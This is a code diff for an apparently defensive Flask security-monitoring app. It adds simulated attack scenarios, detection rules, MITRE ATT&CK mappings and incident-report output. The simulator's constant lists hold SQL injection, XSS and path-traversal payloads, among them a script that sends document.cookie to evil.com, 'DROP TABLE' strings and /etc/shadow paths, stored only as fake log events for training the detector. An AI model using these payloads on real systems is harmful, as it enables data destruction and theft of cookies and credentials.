@@ -640,62 +640,160 @@ def control_room():
 
 # ── Shared business logic (used by browser routes AND cron) ──────────────────
 
-def _simulate_attack_core(owner_id=None):
+def _simulate_attack_core(owner_id=None, difficulty="medium"):
     """
-    Write 8 fake attack events to the log and DB security_events table.
-    Randomises IPs, target usernames, and injection payloads each run for realism.
-    owner_id tags events to a specific client (None = system/cron events).
-    Called by /simulate-attack (browser) and /cron/run (automated).
+    Generate a randomised attack scenario and write events to the DB.
+    difficulty: "easy" | "medium" | "hard"
+    - easy:   single obvious attack type, no false positives
+    - medium: realistic multi-event scenarios, varied techniques
+    - hard:   subtle patterns, false positives mixed in, multi-vector
+
+    owner_id tags events to a specific client (None = cron/system).
     Returns the number of events generated.
     """
     import random
 
-    # TEST-NET ranges (RFC 5737) — documentation-only, never real routable IPs
-    attacker_ips = [
-        "203.0.113.42", "203.0.113.99",
-        "198.51.100.17", "198.51.100.88",
-        "192.0.2.55",
-    ]
-    # Common brute-force targets
-    target_usernames = ["admin", "administrator", "root", "user", "test"]
-    # Varied SQL injection payloads
-    injection_payloads = [
-        "' OR '1'='1",
-        "' UNION SELECT username, password FROM users--",
-        "'; DROP TABLE users;--",
-        "' AND 1=1--",
-        "1' OR '1'='1' /*",
-        "' OR 1=1--",
-    ]
+    # TEST-NET ranges (RFC 5737) — documentation-only IPs
+    ATTACKER_IPS  = ["203.0.113.42","203.0.113.99","198.51.100.17","198.51.100.88","192.0.2.55"]
+    USERNAMES     = ["admin","administrator","root","user","test","support","guest","operator"]
+    LEGIT_USERS   = ["alice","bob","charlie","diana","eve"]
 
-    attacker_ip  = random.choice(attacker_ips)
-    target_user  = random.choice(target_usernames)
-    payloads     = random.sample(injection_payloads, 2)
+    SQL_PAYLOADS  = [
+        "' OR '1'='1", "' UNION SELECT username, password FROM users--",
+        "'; DROP TABLE users;--", "' AND 1=1--", "1' OR '1'='1' /*", "' OR 1=1--",
+        "' OR 'x'='x", "admin'--",
+    ]
+    XSS_PAYLOADS  = [
+        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
+        "javascript:alert(document.cookie)", "<svg onload=alert(1)>",
+        "'\"><script>fetch('https://evil.com?c='+document.cookie)</script>",
+    ]
+    TRAVERSAL_PATHS = [
+        "../../etc/passwd", "../../../etc/shadow", "..%2F..%2Fetc%2Fpasswd",
+        "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
+    ]
+    PRIV_ESC_ROUTES = ["/admin", "/control-room", "/api/users", "/api/admin", "/.env", "/config"]
+    SPRAY_PASSWORDS = ["Password1!", "Summer2024!", "Welcome1!", "Company123!", "Admin@2024"]
 
-    for _ in range(5):
-        security_log.warning(f"LOGIN_FAILED username={target_user} ip={attacker_ip}")
+    ip      = random.choice(ATTACKER_IPS)
+    target  = random.choice(USERNAMES)
+    legit   = random.choice(LEGIT_USERS)
+
+    def insert(event_type, username, ip, extra=""):
         db_run(
             f"INSERT INTO security_events (event_type, username, ip, extra, owner_id)"
             f" VALUES ({PH},{PH},{PH},{PH},{PH})",
-            ("LOGIN_FAILED", target_user, attacker_ip, "", owner_id),
+            (event_type, username, ip, extra, owner_id),
         )
 
-    security_log.info(f"LOGIN_SUCCESS username={target_user} ip={attacker_ip}")
-    db_run(
-        f"INSERT INTO security_events (event_type, username, ip, extra, owner_id)"
-        f" VALUES ({PH},{PH},{PH},{PH},{PH})",
-        ("LOGIN_SUCCESS", target_user, attacker_ip, "", owner_id),
-    )
+    # ── SCENARIO LIBRARY ─────────────────────────────────────────────────────
 
-    for payload in payloads:
-        security_log.info(f"SEARCH username={target_user} query={payload!r} ip={attacker_ip}")
-        db_run(
-            f"INSERT INTO security_events (event_type, username, ip, extra, owner_id)"
-            f" VALUES ({PH},{PH},{PH},{PH},{PH})",
-            ("SEARCH", target_user, attacker_ip, payload, owner_id),
-        )
+    def scenario_brute_force():
+        """Classic brute force — repeated login failures then success. T1110"""
+        for _ in range(random.randint(5, 8)):
+            insert("LOGIN_FAILED", target, ip)
+        insert("LOGIN_SUCCESS", target, ip)
 
-    return 8
+    def scenario_sql_injection():
+        """SQL injection attempts via search/input fields. T1190"""
+        insert("LOGIN_SUCCESS", legit, "10.0.0.1")  # legitimate baseline
+        for p in random.sample(SQL_PAYLOADS, random.randint(2, 4)):
+            insert("SEARCH", target, ip, p)
+
+    def scenario_xss_attack():
+        """Cross-site scripting payloads submitted via input fields. T1059.007"""
+        insert("LOGIN_SUCCESS", legit, "10.0.0.2")  # baseline
+        for p in random.sample(XSS_PAYLOADS, random.randint(2, 3)):
+            insert("XSS_ATTEMPT", target, ip, p)
+
+    def scenario_directory_traversal():
+        """Attacker probing filesystem via path traversal. T1083"""
+        for path in random.sample(TRAVERSAL_PATHS, random.randint(3, 5)):
+            insert("DIRECTORY_TRAVERSAL", target, ip, path)
+
+    def scenario_credential_stuffing():
+        """Same IP, many different accounts — leaked credential list. T1110.004"""
+        victims = random.sample(USERNAMES, random.randint(4, 6))
+        for v in victims:
+            insert("LOGIN_FAILED", v, ip)
+            insert("LOGIN_FAILED", v, ip)
+        # One account was in the breach — gets in
+        insert("LOGIN_SUCCESS", random.choice(victims), ip)
+
+    def scenario_password_spray():
+        """One common password tried across many accounts. T1110.003
+        Hard to detect — low failure count per account."""
+        password = random.choice(SPRAY_PASSWORDS)
+        victims = random.sample(USERNAMES, random.randint(5, 7))
+        for v in victims:
+            insert("LOGIN_FAILED", v, ip, f"sprayed_password={password}")
+
+    def scenario_privilege_escalation():
+        """Logged-in user probing restricted routes. T1548"""
+        insert("LOGIN_SUCCESS", legit, ip)
+        for route in random.sample(PRIV_ESC_ROUTES, random.randint(3, 5)):
+            insert("PRIV_ESC_ATTEMPT", legit, ip, route)
+
+    def scenario_account_enumeration():
+        """Probing which usernames exist via login response timing. T1589.001"""
+        probed = random.sample(USERNAMES + LEGIT_USERS, random.randint(6, 8))
+        for u in probed:
+            insert("ACCOUNT_ENUM", u, ip)
+
+    def scenario_suspicious_login():
+        """Legitimate account logs in from unusual IP/time — could be account takeover. T1078"""
+        insert("LOGIN_SUCCESS", legit, ip, "new_ip=true unusual_hour=true")
+        for route in random.sample(PRIV_ESC_ROUTES[:3], 2):
+            insert("PRIV_ESC_ATTEMPT", legit, ip, route)
+
+    # False positive events (look suspicious, are benign)
+    def add_false_positives():
+        fp_ip = random.choice(["10.0.0.10", "10.0.0.11", "172.16.0.5"])
+        # Legitimate user mistyped password twice — not brute force
+        insert("LOGIN_FAILED", legit, fp_ip)
+        insert("LOGIN_FAILED", legit, fp_ip)
+        insert("LOGIN_SUCCESS", legit, fp_ip)
+        # Legitimate search with SQL-like word (e.g. "SELECT all items")
+        insert("SEARCH", legit, fp_ip, "SELECT all items from last month")
+
+    # ── DIFFICULTY POOLS ─────────────────────────────────────────────────────
+    easy_scenarios = [
+        scenario_brute_force,
+        scenario_sql_injection,
+        scenario_directory_traversal,
+    ]
+    medium_scenarios = [
+        scenario_brute_force,
+        scenario_sql_injection,
+        scenario_xss_attack,
+        scenario_credential_stuffing,
+        scenario_directory_traversal,
+        scenario_account_enumeration,
+    ]
+    hard_scenarios = [
+        scenario_password_spray,
+        scenario_privilege_escalation,
+        scenario_suspicious_login,
+        scenario_credential_stuffing,
+    ]
+
+    if difficulty == "easy":
+        chosen = random.choice(easy_scenarios)
+        chosen()
+    elif difficulty == "hard":
+        # Multi-vector: two scenarios + false positives
+        chosen = random.sample(hard_scenarios, 2)
+        for s in chosen: s()
+        add_false_positives()
+    else:  # medium (default)
+        chosen = random.choice(medium_scenarios)
+        chosen()
+
+    # Return count of events generated
+    return db_fetchone(
+        f"SELECT COUNT(*) AS cnt FROM security_events WHERE processed = {PH} AND owner_id {'= ' + PH if owner_id is not None else 'IS NULL'}",
+        (0, owner_id) if owner_id is not None else (0,),
+    )["cnt"]
 
 
 def _run_agent_core(triggered_by="unknown", owner_id=None):
@@ -711,7 +809,11 @@ def _run_agent_core(triggered_by="unknown", owner_id=None):
 
     log_path = Path(os.environ.get("LOG_FILE", "")) if os.environ.get("LOG_FILE") else None
 
-    events = {"login_failed": [], "login_success": [], "search": [], "register": []}
+    events = {
+        "login_failed": [], "login_success": [], "search": [], "register": [],
+        "xss_attempt": [], "directory_traversal": [], "priv_esc_attempt": [],
+        "account_enum": [],
+    }
 
     # Source 1: log file (local dev with LOG_FILE set)
     if log_path and log_path.exists():
@@ -751,15 +853,33 @@ def _run_agent_core(triggered_by="unknown", owner_id=None):
             (0,),
         )
     for row in db_rows:
-        record = {"timestamp": str(row["created_at"]),
-                  "username":  row["username"], "ip": row["ip"]}
-        etype  = row["event_type"].upper()
-        if   etype == "LOGIN_FAILED":    events["login_failed"].append(record)
-        elif etype == "LOGIN_SUCCESS":   events["login_success"].append(record)
+        record = {
+            "timestamp": str(row["created_at"]),
+            "username":  row["username"],
+            "ip":        row["ip"],
+            "extra":     row.get("extra", ""),
+        }
+        etype = row["event_type"].upper()
+        if   etype == "LOGIN_FAILED":
+            events["login_failed"].append(record)
+        elif etype == "LOGIN_SUCCESS":
+            events["login_success"].append(record)
         elif etype == "SEARCH":
             record["query"] = row["extra"]
             events["search"].append(record)
-        elif etype == "REGISTER_SUCCESS":events["register"].append(record)
+        elif etype == "REGISTER_SUCCESS":
+            events["register"].append(record)
+        elif etype == "XSS_ATTEMPT":
+            record["payload"] = row["extra"]
+            events["xss_attempt"].append(record)
+        elif etype == "DIRECTORY_TRAVERSAL":
+            record["path"] = row["extra"]
+            events["directory_traversal"].append(record)
+        elif etype == "PRIV_ESC_ATTEMPT":
+            record["route"] = row["extra"]
+            events["priv_esc_attempt"].append(record)
+        elif etype == "ACCOUNT_ENUM":
+            events["account_enum"].append(record)
     if db_rows:
         # Mark processed — keep for the live event feed history, never delete
         if owner_id is not None:
@@ -787,6 +907,34 @@ def _run_agent_core(triggered_by="unknown", owner_id=None):
         "SQL_INJECTION_ATTEMPT": {
             "id": "T1190", "name": "Exploit Public-Facing Application",
             "tactic": "Initial Access",
+        },
+        "XSS_ATTEMPT": {
+            "id": "T1059.007", "name": "JavaScript (Cross-Site Scripting)",
+            "tactic": "Execution",
+        },
+        "DIRECTORY_TRAVERSAL": {
+            "id": "T1083", "name": "File and Directory Discovery",
+            "tactic": "Discovery",
+        },
+        "PASSWORD_SPRAY": {
+            "id": "T1110.003", "name": "Password Spraying",
+            "tactic": "Credential Access",
+        },
+        "CREDENTIAL_STUFFING": {
+            "id": "T1110.004", "name": "Credential Stuffing",
+            "tactic": "Credential Access",
+        },
+        "PRIVILEGE_ESCALATION": {
+            "id": "T1548", "name": "Abuse Elevation Control Mechanism",
+            "tactic": "Privilege Escalation",
+        },
+        "ACCOUNT_ENUMERATION": {
+            "id": "T1589.001", "name": "Gather Victim Identity Information",
+            "tactic": "Reconnaissance",
+        },
+        "SUSPICIOUS_LOGIN": {
+            "id": "T1078", "name": "Valid Accounts",
+            "tactic": "Defense Evasion",
         },
     }
 
@@ -822,6 +970,106 @@ def _run_agent_core(triggered_by="unknown", owner_id=None):
                 "mitre": MITRE_MAP["SQL_INJECTION_ATTEMPT"],
             })
 
+    # XSS detection — any XSS_ATTEMPT event is a threat
+    for e in events["xss_attempt"]:
+        threats.append({
+            "type": "XSS_ATTEMPT", "severity": "HIGH",
+            "username": e.get("username", "unknown"),
+            "payload": e.get("payload", ""),
+            "ip": e.get("ip", "unknown"),
+            "timestamp": e["timestamp"],
+            "mitre": MITRE_MAP["XSS_ATTEMPT"],
+        })
+
+    # Directory traversal — group by IP
+    traversal_by_ip = defaultdict(list)
+    for e in events["directory_traversal"]:
+        traversal_by_ip[e.get("ip", "unknown")].append(e)
+    for ip_addr, attempts in traversal_by_ip.items():
+        threats.append({
+            "type": "DIRECTORY_TRAVERSAL", "severity": "MEDIUM",
+            "username": attempts[0].get("username", "unknown"),
+            "paths": [e.get("path", "") for e in attempts],
+            "attempts": len(attempts),
+            "ip": ip_addr,
+            "first_seen": attempts[0]["timestamp"],
+            "last_seen":  attempts[-1]["timestamp"],
+            "mitre": MITRE_MAP["DIRECTORY_TRAVERSAL"],
+        })
+
+    # Privilege escalation — group by username
+    priv_esc_by_user = defaultdict(list)
+    for e in events["priv_esc_attempt"]:
+        priv_esc_by_user[e.get("username", "unknown")].append(e)
+    for uname, attempts in priv_esc_by_user.items():
+        threats.append({
+            "type": "PRIVILEGE_ESCALATION", "severity": "HIGH",
+            "username": uname,
+            "routes": [e.get("route", "") for e in attempts],
+            "attempts": len(attempts),
+            "ip": attempts[0].get("ip", "unknown"),
+            "timestamp": attempts[0]["timestamp"],
+            "mitre": MITRE_MAP["PRIVILEGE_ESCALATION"],
+        })
+
+    # Account enumeration — same IP probing many usernames
+    enum_by_ip = defaultdict(list)
+    for e in events["account_enum"]:
+        enum_by_ip[e.get("ip", "unknown")].append(e)
+    for ip_addr, attempts in enum_by_ip.items():
+        if len(attempts) >= 4:
+            threats.append({
+                "type": "ACCOUNT_ENUMERATION", "severity": "MEDIUM",
+                "ip": ip_addr,
+                "usernames_probed": len(attempts),
+                "first_seen": attempts[0]["timestamp"],
+                "last_seen":  attempts[-1]["timestamp"],
+                "mitre": MITRE_MAP["ACCOUNT_ENUMERATION"],
+            })
+
+    # Password spray — same IP, low failures per account, sprayed_password in extra
+    spray_by_ip = defaultdict(set)
+    for e in events["login_failed"]:
+        if "sprayed_password=" in e.get("extra", ""):
+            spray_by_ip[e.get("ip", "unknown")].add(e.get("username", "unknown"))
+    for ip_addr, accounts in spray_by_ip.items():
+        if len(accounts) >= 4:
+            threats.append({
+                "type": "PASSWORD_SPRAY", "severity": "HIGH",
+                "ip": ip_addr,
+                "accounts_targeted": len(accounts),
+                "mitre": MITRE_MAP["PASSWORD_SPRAY"],
+            })
+
+    # Credential stuffing — same IP, many DIFFERENT accounts failing (without spray marker)
+    stuff_by_ip = defaultdict(set)
+    for e in events["login_failed"]:
+        if "sprayed_password=" not in e.get("extra", ""):
+            stuff_by_ip[e.get("ip", "unknown")].add(e.get("username", "unknown"))
+    for ip_addr, accounts in stuff_by_ip.items():
+        if len(accounts) >= 4:
+            successes = [s for s in events["login_success"] if s.get("ip") == ip_addr]
+            threats.append({
+                "type": "CREDENTIAL_STUFFING",
+                "severity": "CRITICAL" if successes else "HIGH",
+                "ip": ip_addr,
+                "accounts_targeted": len(accounts),
+                "succeeded": bool(successes),
+                "mitre": MITRE_MAP["CREDENTIAL_STUFFING"],
+            })
+
+    # Suspicious login — login_success with unusual marker in extra
+    for e in events["login_success"]:
+        extra = e.get("extra", "")
+        if "unusual_hour=true" in extra or "new_ip=true" in extra:
+            threats.append({
+                "type": "SUSPICIOUS_LOGIN", "severity": "MEDIUM",
+                "username": e.get("username", "unknown"),
+                "ip": e.get("ip", "unknown"),
+                "timestamp": e["timestamp"],
+                "mitre": MITRE_MAP["SUSPICIOUS_LOGIN"],
+            })
+
     threat_count = len(threats)
     event_count  = sum(len(v) for v in events.values())
 
@@ -835,6 +1083,10 @@ def _run_agent_core(triggered_by="unknown", owner_id=None):
                 "failed_logins": len(events["login_failed"]),
                 "successful_logins": len(events["login_success"]),
                 "searches": len(events["search"]),
+                "xss_attempts": len(events["xss_attempt"]),
+                "directory_traversals": len(events["directory_traversal"]),
+                "priv_esc_attempts": len(events["priv_esc_attempt"]),
+                "account_enum_events": len(events["account_enum"]),
                 "threats_detected": threat_count,
                 "threats": threats,
             }
@@ -877,24 +1129,37 @@ def _run_agent_core(triggered_by="unknown", owner_id=None):
         except Exception as exc:
             content = f"# Report Generation Error\n\nAI report could not be generated: {exc}"
     else:
-        failed_ct  = len(events["login_failed"])
-        success_ct = len(events["login_success"])
-        search_ct  = len(events["search"])
+        failed_ct    = len(events["login_failed"])
+        success_ct   = len(events["login_success"])
+        search_ct    = len(events["search"])
+        xss_ct       = len(events["xss_attempt"])
+        traversal_ct = len(events["directory_traversal"])
+        priv_esc_ct  = len(events["priv_esc_attempt"])
+        enum_ct      = len(events["account_enum"])
         lines = [
             "# Incident Report\n", "---\n", "## Events Analysed\n",
             f"| Event type | Count |", f"|---|---|",
             f"| Failed login attempts | {failed_ct} |",
             f"| Successful logins | {success_ct} |",
             f"| Search / query events | {search_ct} |",
-            f"| **Total** | **{event_count}** |", "",
         ]
+        if xss_ct:       lines.append(f"| XSS attempts | {xss_ct} |")
+        if traversal_ct: lines.append(f"| Directory traversal | {traversal_ct} |")
+        if priv_esc_ct:  lines.append(f"| Privilege escalation probes | {priv_esc_ct} |")
+        if enum_ct:      lines.append(f"| Account enumeration | {enum_ct} |")
+        lines += [f"| **Total** | **{event_count}** |", ""]
+
+        SEVERITY_ICON = {"CRITICAL": "🔴", "HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🟢"}
         if threat_count > 0:
             lines.append(f"## Threats Detected: {threat_count}\n")
             for t in threats:
+                icon = SEVERITY_ICON.get(t.get("severity", "HIGH"), "🔴")
+                mitre_tag = f"{t['mitre']['id']} {t['mitre']['name']}"
                 if t["type"] == "BRUTE_FORCE":
                     outcome = "✅ Account compromised" if t.get("succeeded") else "🛡 Access denied"
                     lines.append(
-                        f"### 🔴 Brute Force Attack — {t['severity']}\n"
+                        f"### {icon} Brute Force Attack — {t['severity']}\n"
+                        f"- **MITRE:** {mitre_tag}\n"
                         f"- **Target account:** {t['username']}\n"
                         f"- **Attacker IP:** {t['ip']}\n"
                         f"- **Failed attempts:** {t['failed_attempts']}\n"
@@ -903,10 +1168,70 @@ def _run_agent_core(triggered_by="unknown", owner_id=None):
                     )
                 elif t["type"] == "SQL_INJECTION_ATTEMPT":
                     lines.append(
-                        f"### 🔴 SQL Injection Attempt — {t['severity']}\n"
+                        f"### {icon} SQL Injection Attempt — {t['severity']}\n"
+                        f"- **MITRE:** {mitre_tag}\n"
                         f"- **User:** {t.get('username','unknown')}\n"
                         f"- **Attacker IP:** {t['ip']}\n"
                         f"- **Payload:** `{t.get('query','')}`\n"
+                        f"- **Timestamp:** {t.get('timestamp','')}\n"
+                    )
+                elif t["type"] == "XSS_ATTEMPT":
+                    lines.append(
+                        f"### {icon} Cross-Site Scripting (XSS) — {t['severity']}\n"
+                        f"- **MITRE:** {mitre_tag}\n"
+                        f"- **User:** {t.get('username','unknown')}\n"
+                        f"- **Attacker IP:** {t['ip']}\n"
+                        f"- **Payload:** `{t.get('payload','')}`\n"
+                        f"- **Timestamp:** {t.get('timestamp','')}\n"
+                    )
+                elif t["type"] == "DIRECTORY_TRAVERSAL":
+                    lines.append(
+                        f"### {icon} Directory Traversal — {t['severity']}\n"
+                        f"- **MITRE:** {mitre_tag}\n"
+                        f"- **Attacker IP:** {t['ip']}\n"
+                        f"- **Paths probed:** {t['attempts']}\n"
+                        f"- **Sample path:** `{t['paths'][0] if t['paths'] else ''}`\n"
+                        f"- **First seen:** {t['first_seen']} | **Last seen:** {t['last_seen']}\n"
+                    )
+                elif t["type"] == "PRIVILEGE_ESCALATION":
+                    lines.append(
+                        f"### {icon} Privilege Escalation — {t['severity']}\n"
+                        f"- **MITRE:** {mitre_tag}\n"
+                        f"- **User:** {t['username']}\n"
+                        f"- **Attacker IP:** {t['ip']}\n"
+                        f"- **Routes probed:** {', '.join(t.get('routes', []))}\n"
+                        f"- **Timestamp:** {t.get('timestamp','')}\n"
+                    )
+                elif t["type"] == "ACCOUNT_ENUMERATION":
+                    lines.append(
+                        f"### {icon} Account Enumeration — {t['severity']}\n"
+                        f"- **MITRE:** {mitre_tag}\n"
+                        f"- **Attacker IP:** {t['ip']}\n"
+                        f"- **Usernames probed:** {t['usernames_probed']}\n"
+                        f"- **First seen:** {t['first_seen']} | **Last seen:** {t['last_seen']}\n"
+                    )
+                elif t["type"] == "PASSWORD_SPRAY":
+                    lines.append(
+                        f"### {icon} Password Spraying — {t['severity']}\n"
+                        f"- **MITRE:** {mitre_tag}\n"
+                        f"- **Attacker IP:** {t['ip']}\n"
+                        f"- **Accounts targeted:** {t['accounts_targeted']}\n"
+                    )
+                elif t["type"] == "CREDENTIAL_STUFFING":
+                    outcome = "✅ At least one account compromised" if t.get("succeeded") else "🛡 No successful logins"
+                    lines.append(
+                        f"### {icon} Credential Stuffing — {t['severity']}\n"
+                        f"- **MITRE:** {mitre_tag}\n"
+                        f"- **Attacker IP:** {t['ip']}\n"
+                        f"- **Accounts targeted:** {t['accounts_targeted']}\n"
+                        f"- **Outcome:** {outcome}\n"
+                    )
+                elif t["type"] == "SUSPICIOUS_LOGIN":
+                    lines.append(
+                        f"### {icon} Suspicious Login — {t['severity']}\n"
+                        f"- **MITRE:** {mitre_tag}\n"
+                        f"- **User:** {t['username']}\n"
+                        f"- **IP:** {t['ip']}\n"
                         f"- **Timestamp:** {t.get('timestamp','')}\n"
                     )
             lines += ["---\n",
@@ -914,7 +1239,7 @@ def _run_agent_core(triggered_by="unknown", owner_id=None):
                       "to replace this report with a full AI-generated narrative."]
         else:
             lines += ["## No Threats Detected\n",
-                      "The agent found no brute-force or injection patterns in the current events.\n"]
+                      "The agent found no threat patterns in the current events.\n"]
         content = "\n".join(lines)
 
     # Save report — tagged with owner_id for multi-tenancy
@@ -1005,7 +1330,10 @@ def api_ingest():
     Content-Type: application/json
     { "event_type": "LOGIN_FAILED", "username": "admin", "ip": "1.2.3.4", "extra": "" }
     """
-    VALID_EVENT_TYPES = {"LOGIN_FAILED", "LOGIN_SUCCESS", "SEARCH", "REGISTER_SUCCESS"}
+    VALID_EVENT_TYPES = {
+        "LOGIN_FAILED", "LOGIN_SUCCESS", "SEARCH", "REGISTER_SUCCESS",
+        "XSS_ATTEMPT", "DIRECTORY_TRAVERSAL", "PRIV_ESC_ATTEMPT", "ACCOUNT_ENUM",
+    }
 
     api_key = request.headers.get("X-API-Key", "").strip()
     if not api_key:
@@ -1045,12 +1373,19 @@ def api_ingest():
 @login_required
 def simulate_attack():
     """Browser-facing wrapper around _simulate_attack_core()."""
-    _simulate_attack_core(owner_id=session.get("user_id"))
+    difficulty = request.form.get("difficulty", "medium")
+    if difficulty not in ("easy", "medium", "hard"):
+        difficulty = "medium"
+    count = _simulate_attack_core(owner_id=session.get("user_id"), difficulty=difficulty)
     if "text/html" in request.accept_mimetypes:
-        flash("⚡ Attack simulation complete — 8 events written. Now click Run Agent.", "info")
+        flash(
+            f"⚡ Attack simulation complete ({difficulty.upper()}) — "
+            f"{count} event(s) queued. Now click Run Agent.",
+            "info",
+        )
         dest = "control_room" if session.get("role") == "analyst" else "reports"
         return redirect(url_for(dest))
-    return jsonify(status="ok", events_generated=8)
+    return jsonify(status="ok", events_generated=count, difficulty=difficulty)
 
 
 # --- ROUTE 6: Agent Trigger (browser) ---
